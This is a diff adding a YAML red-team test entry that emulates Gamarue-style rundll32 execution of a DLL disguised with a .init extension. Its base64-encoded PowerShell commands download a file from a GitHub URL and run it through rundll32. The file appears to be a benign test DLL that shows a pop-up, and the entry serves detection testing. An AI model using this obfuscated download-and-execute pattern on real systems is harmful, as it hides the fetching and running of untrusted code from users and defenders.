@@ -1,0 +1,20 @@
+- id: c334cd0a-61f2-5b41-89de-ff197a3e31a6
+  name: Soumaia ART Tests - Running DLL with .init extension and function
+  description: 'This test, based on common Gamarue tradecraft, consists of a DLL file with a .init extension being run by rundll32.exe. When this DLL file''s ''krnl'' function is called, it launches a Windows pop-up.
+
+    DLL created with the AtomicTestHarnesses Portable Executable Builder script.'
+  tactic: stealth
+  technique:
+    attack_id: T1218.011
+    name: 'Signed Binary Proxy Execution: Rundll32'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAF8AVwBUAC4AaQBuAGkAdAAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AA==
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABfAFcAVAAuAGkAbgBpAHQAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAyADEAOAAuADAAMQAxAC8AYgBpAG4ALwBfAFcAVAAuAGkAbgBpAHQAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAF8AVwBUAC4AaQBuAGkAdAAiAAoA
+          )
+          rundll32.exe .\_WT.init,krnl
+        payloads:
+        - _WT.init
